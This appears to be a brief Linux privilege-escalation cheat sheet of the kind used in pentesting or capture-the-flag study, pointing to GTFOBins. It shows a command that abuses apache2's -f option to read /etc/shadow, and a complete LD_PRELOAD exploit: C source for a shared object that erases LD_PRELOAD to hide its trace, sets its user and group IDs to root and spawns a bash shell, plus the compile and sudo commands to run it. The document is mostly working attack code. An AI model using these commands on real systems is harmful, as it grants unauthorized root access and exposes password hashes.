---

Good source : https://gtfobins.github.io/

```bash
apache2 -f /etc/shadow
	#Apache2 has an option that supports loading alternative configuration files. (-f specify an alternate ServerConfigFile)


```

## Leverage LD_PRELOAD
LD_PRELOAD is a function that allows any program to use shared libraries.

If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run and the setting(i.e `$PATH`, etc...) of `LD_PRELOAD` will be preserved. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.

The steps of this privilege escalation vector can be summarized as follows;

1. Check for LD_PRELOAD (with the env_keep option)
2. Write a simple C code compiled as a share object (.so extension) file
3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

shell.c :

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() { // execute when loaded.
    unsetenv("LD_PRELOAD"); // erase the trace.
    setgid(0); // su root group.
    setuid(0); // su to root.
    system("/bin/bash"); // get shell！
}
```

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

```bash
sudo LD_PRELOAD=/tmp/shell.so find
```




